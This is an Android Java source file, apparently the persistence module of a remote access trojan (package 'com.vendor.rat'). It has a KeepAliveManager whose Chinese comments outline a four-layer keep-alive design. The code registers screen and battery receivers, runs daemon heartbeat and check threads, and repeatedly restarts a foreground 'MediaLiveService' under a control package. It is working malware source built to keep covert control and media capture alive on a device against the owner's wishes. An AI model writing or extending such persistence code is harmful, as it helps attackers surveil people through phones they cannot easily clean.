package com.vendor.rat.keepalive;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.Build;
import android.util.Log;

import com.vendor.rat.control.service.MediaLiveService;
import com.vendor.rat.keepalive.receiver.BatteryLevelReceiver;
import com.vendor.rat.keepalive.receiver.ScreenBroadcastReceiver;
import com.vendor.rat.keepalive.thread.CheckThread;
import com.vendor.rat.keepalive.thread.HeartThread;

/**
 * 保活管理器 (模块 07 核心)
 *
 * 4 层保活架构:
 *   1. 系统广播监听
 *   2. 前台服务
 *   3. 定时唤醒
 *   4. 辅助保活（账号同步 + 进程监控）
 */
public class KeepAliveManager {

    private static final String TAG = "KeepAliveManager";
    private static volatile KeepAliveManager instance;

    private CheckThread checkThread;
    private HeartThread heartThread;
    private volatile boolean lowPowerMode = false;

    private KeepAliveManager() {}

    public static KeepAliveManager getInstance() {
        if (instance == null) {
            synchronized (KeepAliveManager.class) {
                if (instance == null) {
                    instance = new KeepAliveManager();
                }
            }
        }
        return instance;
    }

    /**
     * 初始化所有保活机制
     */
    public void init(Context context) {
        // 1. 注册广播
        registerReceivers(context);

        // 2. 启动监控线程
        startCheckThread();

        // 3. 启动心跳线程
        startHeartThread();

        Log.i(TAG, "KeepAliveManager initialized");
    }

    private void registerReceivers(Context context) {
        // 息屏/亮屏
        ScreenBroadcastReceiver.register(context);

        // 电池状态
        IntentFilter batteryFilter = new IntentFilter();
        batteryFilter.addAction(Intent.ACTION_BATTERY_CHANGED);
        batteryFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        batteryFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        context.registerReceiver(new BatteryLevelReceiver(), batteryFilter);
    }

    /**
     * 启动所有核心服务
     */
    public void startAllServices(Context context) {
        Intent mediaIntent = new Intent(context, MediaLiveService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(mediaIntent);
        } else {
            context.startService(mediaIntent);
        }
    }

    /**
     * 确保服务存活
     */
    public void ensureServicesRunning(Context context) {
        if (!lowPowerMode && context != null) {
            startAllServices(context);
        }
    }

    private void startCheckThread() {
        if (checkThread == null || !checkThread.isAlive()) {
            checkThread = new CheckThread();
            checkThread.setDaemon(true);
            checkThread.start();
        }
    }

    private void startHeartThread() {
        if (heartThread == null || !heartThread.isAlive()) {
            heartThread = new HeartThread();
            heartThread.setDaemon(true);
            heartThread.start();
        }
    }

    public void restartHeartThread() {
        if (heartThread != null) heartThread.stopHeartbeat();
        startHeartThread();
    }

    public HeartThread getHeartThread() { return heartThread; }
    public void enterLowPowerMode() { lowPowerMode = true; }
    public void exitLowPowerMode() { lowPowerMode = false; }

    public void shutdown() {
        if (checkThread != null) checkThread.stopChecking();
        if (heartThread != null) heartThread.stopHeartbeat();
    }
}
